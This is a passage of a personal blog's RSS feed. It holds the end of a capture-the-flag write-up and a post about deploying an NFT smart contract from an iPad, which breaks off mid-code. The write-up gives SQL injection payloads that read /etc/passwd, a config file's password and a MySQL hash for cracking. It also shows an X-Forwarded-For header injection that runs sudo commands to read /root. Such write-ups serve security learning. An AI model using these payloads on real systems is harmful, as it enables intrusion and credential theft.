&lt;li&gt;First, we use ​&lt;code&gt;&#039; UNION SELECT CONCAT(&#039;$mysql&#039;,LEFT(authentication_string,6),&#039;*&#039;,INSERT(HEX(SUBSTR(authentication_string,8)),41,0,&#039;*&#039;)) FROM mysql.user WHERE user = &#039;uhc&#039;&lt;/code&gt;​ to get a string that &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hashcat&quot;&gt;Hashcat&lt;/a&gt; can handle.&lt;/li&gt;
&lt;li&gt;Then we run &lt;code&gt;hashcat -m 7401 -O hash.txt rockyou.txt&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;But, this is going to take a loooong time… So, I tried a few other things:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;There’s 6 users in the &lt;code&gt;players&lt;/code&gt; table, but none of them work as passwords (or alternate user names).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#039; UNION SELECT LOAD_FILE(&#039;/etc/passwd&#039;) -- 1&lt;/code&gt; displays the password file, but I can’t access /etc/shadow, so it doesn’t look like we’re running as root.&lt;/li&gt;
&lt;li&gt;But we can look at other files, including /config.php! And it turns out that there’s a cleartext password there that we can read with &lt;code&gt;&#039; UNION SELECT LOAD_FILE(&#039;/var/www/html/config.php&#039;) -- 1&lt;/code&gt; : &lt;code&gt;uhc-11qual-global-pw&lt;/code&gt;. ​&lt;em&gt;This works to log in as the &lt;code&gt;uhc&lt;/code&gt; user!&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The &lt;strong&gt;first flag&lt;/strong&gt; is then in the user.txt file in /home/uhc.&lt;/p&gt;
&lt;p&gt;Unfortunately, uhc isn’t in the sudoers file, and there’s no obviously vulnerably SUID binaries or files with loose permissions.&lt;/p&gt;
&lt;p&gt;But…&lt;/p&gt;
&lt;p&gt;If you run &lt;code&gt;&#039; UNION SELECT LOAD_FILE(&#039;/var/www/html/firewall.php&#039;) -- 1&lt;/code&gt; , you’ll see that the &lt;em&gt;web server&lt;/em&gt; has &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo&lt;/a&gt; access, and uses it to make a call to iptables using the value of either the X-Forwarded-For or Remote-Host headers. And since this call is just a concatenation of the value of this header wrapped in &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/php&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/php&quot;&gt;PHP&lt;/a&gt;’s &lt;code&gt;system()&lt;/code&gt; call, that means &lt;em&gt;I&lt;/em&gt; can insert whatever I want. For example, setting&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;http&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;http&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;X-Forwarded-For:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; 127.0.0.1 -j ACCEPT; sudo ls -la /root ; echo&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;lists the contents of the /root directory, revealing the standard /root/root.txt flag file. And thus&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;http&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;http&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;X-Forwarded-For:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; 127.0.0.1 -j ACCEPT; sudo cat /root/root.txt ; echo&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;will return the contents of that file.&lt;/p&gt;
&lt;p&gt;Which just so happens to be the ​&lt;strong&gt;second flag&lt;/strong&gt;​.&lt;/p&gt;
&lt;p&gt;(Really, I &lt;em&gt;should&lt;/em&gt; have used this trick to get both flags…)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 4 h 6 min&lt;/p&gt;</description>
    <pubDate>Thu, 27 Apr 2023 00:00:00 GMT</pubDate>
  </item><item>
    <title>Trying (and failing) to deploy a smart contract using an iPad Pro</title>
    <link>https://cardboard-iguana.com/grimoire/commentaries/2022-11-27-trying-and-failing-to-deploy-a-smart-contract-using-an-ipad-pro</link>
    <guid>https://cardboard-iguana.com/grimoire/commentaries/2022-11-27-trying-and-failing-to-deploy-a-smart-contract-using-an-ipad-pro</guid>
    <description>&lt;p&gt;My personal project this weekend was to deploy a smart contract to the Ethereum blockchain. The motivation here was to be able to mint an NFT (really, several NFTs) for use as an avatar on &lt;a href=&quot;https://www.farcaster.xyz/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Farcaster&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, an alternative to Twitter that &lt;a href=&quot;https://fcast.me/necopinus&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;I’ve been experimenting with&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; for a few weeks now. Using an NFT as your avatar on Farcaster adds a “&lt;a href=&quot;https://farcasterxyz.notion.site/How-to-get-a-purple-checkmark-fb66f0cb0f5f4f24b699b8f288a2f14a&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;purple checkmark&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;” to your account, a spoof on Twitter’s infamous &lt;a href=&quot;https://help.twitter.com/managing-your-account/about-twitter-verified-accounts&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;blue checkmark&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(For those who are interested, &lt;a href=&quot;https://support.opensea.io/hc/en-us/articles/4415562648851-How-do-I-set-my-NFT-as-my-Twitter-profile-picture-&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Twitter provides the ability to set an NFT as your avatar&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, though you need to subscribe to “Twitter Blue” and be using iOS in order to access this feature.)&lt;/p&gt;
&lt;p&gt;The central problem here is that if I use an NFT as my avatar, then I need to pay for another NFT (either to buy one or mint one myself) whenever I decide I want to change my avatar. Also, my current (and favorite) avatar is taken from a &lt;a href=&quot;https://dangerousminds.net/comments/the_artist_who_visited_dune&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;John Schoenherr&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; painting of one of the great sandworms of Arrakis — I’m not sure I want to “mint” that in any way that could be interpreted as me claiming “ownership” of it. It’s Schoenherr’s painting after all!&lt;/p&gt;
&lt;p&gt;Finally, all of the services I’ve seen that allow you to mint your own NFT store the associated JSON metadata and image file using a decentralized solution like &lt;a href=&quot;https://ipfs.tech/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;IPFS&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; or &lt;a href=&quot;https://www.arweave.org/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Arweave&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. This is actually a good thing, because it gives “collectable” NFTs a degree of permanence, but in my case I actually &lt;em&gt;want&lt;/em&gt; to be able to update the associated metadata and image arbitrarily. Fortunately, I control my own domain and &lt;a href=&quot;https://eips.ethereum.org/EIPS/eip-721&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;EIP-721&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; (which defines the NFT standard) doesn’t forbid using “non-permenant” &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/uniform-resource-locators&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/uniform-resource-locators&quot;&gt;URIs&lt;/a&gt;, so all this means is that I need to deploy my own smart contract to create my NFT avatar(s), rather than using a pre-packaged solution.&lt;/p&gt;
&lt;p&gt;That all sounds easy enough, but I &lt;em&gt;also&lt;/em&gt; wanted to try to do this using only my iPad Pro, since I regard that as a more secure computing device than a regular desktop. (In fact, I’ve gradually come to prefer my iPad Pro over my laptop, so it’s not &lt;em&gt;just&lt;/em&gt; about system security.) As you can probably guess from the title of this post, I failed to accomplish this particular goal… Though I came &lt;em&gt;very&lt;/em&gt; close to succeeding!&lt;/p&gt;
&lt;p&gt;While working on the iPad, I used Safari with the &lt;a href=&quot;https://wallet.light.so&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Light Wallet&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; extension for interacting with the Ethereum blockchain.&lt;/p&gt;
&lt;p&gt;As fate would have it, I started using a standard location for my avatar (&lt;a href=&quot;https://necopinus.xyz/%E2%80%8Bavatar/%E2%80%8Bavatar.webp&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;https://necopinus.xyz/​avatar/​avatar.webp&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;) when I set up my ENS domains. For some reason the correct URL isn’t showing up on &lt;a href=&quot;https://app.ens.domains/name/necopinus.xyz/details&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;the ENS console&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, even though it appears to be set when I view it in the controlling &lt;a href=&quot;https://app.safe.global/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Safe&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; app. I’m not sure why this is, but the important thing is that I already have a standard location for my avatar.&lt;/p&gt;
&lt;p&gt;The first real step was thus to upload a JSON metadata file pointing to this avatar.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;json&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;json&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#99841877;--shiki-dark:#99841877&quot;&gt;	&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#998418&quot;&gt;description&lt;/span&gt;&lt;span style=&quot;--shiki-light:#99841877;--shiki-dark:#99841877&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;The avatar NFT for necopinus.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#99841877;--shiki-dark:#99841877&quot;&gt;	&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#998418&quot;&gt;external_url&lt;/span&gt;&lt;span style=&quot;--shiki-light:#99841877;--shiki-dark:#99841877&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;https://necopinus.xyz/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#99841877;--shiki-dark:#99841877&quot;&gt;	&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#998418&quot;&gt;image&lt;/span&gt;&lt;span style=&quot;--shiki-light:#99841877;--shiki-dark:#99841877&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;https://necopinus.xyz/avatar/avatar.webp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#99841877;--shiki-dark:#99841877&quot;&gt;	&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#998418&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;--shiki-light:#99841877;--shiki-dark:#99841877&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;necopinus&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;I put this at &lt;code&gt;https://necopinus.xyz/​avatar/​ethereum/​&amp;#x3C;WALLET_ADDRESS&gt;.json&lt;/code&gt; to make it straight forward to support additional wallets and blockchains in the future.&lt;/p&gt;
&lt;p&gt;Once this was done, I decided to more-or-less follow the “&lt;a href=&quot;https://docs.alchemy.com/docs/how-to-develop-an-nft-smart-contract-erc721-with-alchemy&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;How to Develop an NFT Smart Contract (ERC721) with Alchemy&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;” walk-through. I’m going to skip a lot of the details here, so if you’re trying to do this yourself you should also read through that document.&lt;/p&gt;
&lt;p&gt;I also tested deploying the smart contract and minting my NFTs on the Goerli TestNet before committing any money to deploy on the Ethereum MainNet. To do this, you’ll need to get some GoerliETH; the easiest way to do this is to create an account on &lt;a href=&quot;https://www.alchemy.com&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Alchemy&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and then visit &lt;a href=&quot;https://goerlifaucet.com/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;the Goerli “faucet”&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, which will transfer 0.2 GoerliETH to your wallet (more than enough for what follows.&lt;/p&gt;
&lt;p&gt;Next, go to the &lt;a href=&quot;https://docs.openzeppelin.com/contracts/4.x/wizard&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Open Zeppelin Contracts Wizard&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; to pre-generate smart contract code. I’m going to select an ERC721 contract and select the “Mintable, Autoincrement IDs”, “Enumerable”, and “URI Storage” options + uncreative contract and token names. This produces the following code.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;solidity&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;solidity&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0&quot;&gt;// SPDX-License-Identifier: MIT&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;pragma&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt; solidity&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; ^0.8.9&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; &quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; &quot;@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; &quot;@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; &quot;@openzeppelin/contracts/access/Ownable.sol&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; &quot;@openzeppelin/contracts/utils/Counters.sol&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;contract&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt; NFTAvatar&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt; is&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt; ERC721&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt;ERC721Enumerable&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt;ERC721URIStorage&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt;Ownable&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt; {&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;    using&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt; Counters&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt; for&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#2E8F82&quot;&gt; Counters&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;Counter&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;    Counters&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;Counter &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;private&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt; _tokenIdCounter&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;    constructor&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;) &lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;ERC721&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;&quot;NFTAvatar&quot;, &quot;NFTAVATAR&quot;) &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#999999&quot;&gt;{}&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;
